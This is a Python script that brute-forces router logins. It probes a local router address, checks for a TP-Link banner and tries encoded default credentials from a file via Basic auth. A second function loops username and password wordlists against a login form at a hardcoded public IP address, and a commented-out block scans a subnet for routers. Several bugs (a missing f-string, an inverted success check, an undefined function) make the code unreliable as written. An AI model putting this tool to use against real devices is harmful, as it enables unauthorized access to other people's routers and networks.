import os
import sys
import requests
import threading
'''
hosts = list()
def asfr():
   #scanning for routers locally
   for x in range(0,255):
      url = 'http://'+ '192.168.'+str(x)+'.'+str(1)
      live = requests.get(url)
      hosts.append(live)

router_manufacturer = ['']
user = 'admin'
password = '1234'
MAX_ATTEMPTS = 5
MAX_RETRIES = 3
'''
url = "http://192.168.0.1"
res = requests.get(url)
status = 200
if res.status_code == status:
   print('200 OK '+ url)
   responsecode = res.text
   #Checking for router manufacturer

   if 'TP-LINK' in responsecode:
      print("Router is TP-Link") 

   #TPLINK Router testing Module 
   #Loading Encoded Default PASSWORDS
   with open('encodedcreds.txt','r') as readerCreds:
      for line in readerCreds.readlines():
         cred = line.strip('\n')
         print("[+] Trying with "+cred)
         requestToRouter = requests.get(url, headers={'Authorization':'Basic {cred}'})
         #print(requestToRouter.text)
         if 'Base64Encoding' not in requestToRouter.text:
            print(f"Success-"+str({cred}))
            exit(0)
         else:
            print("Invalid")
            exit(0)

def post_auth_router():
       url = 'http://103.125.161.188/login.cgi'
       with open('users.txt','r') as users_raw_data, open('pass.txt','r') as passwords_raw_data:
          for u in users_raw_data.readlines():
            user = u.strip('\n')
            for p in passwords_raw_data:
               password = p.strip('\n')                 
               print(f"[+] Using Credentials {user} and {password}")
               requestToRouter = requests.post(url, data=f"username={user}&password={password}&submit.htm?login.htm=Send", headers={"Content-Type": "application/x-www-form-urlencoded"})
               #print(requestToRouter.text)
               if 'Username or password error' in requestToRouter:
                  print(f"Success with "+{user}+{password})
                  print("Exiting...")
                  exit(0)
               else:
                  print("404 Not Found...")

#
#if __name__ == '__main__':
#   print("Initializing...")
#   meth = int(input('''1. Automatic Local Network scan
#            2. Manual scan'''))
#   if meth == 1:
#      #Automatic scan for routers
#      asfr()
#   else:
#      msfr()
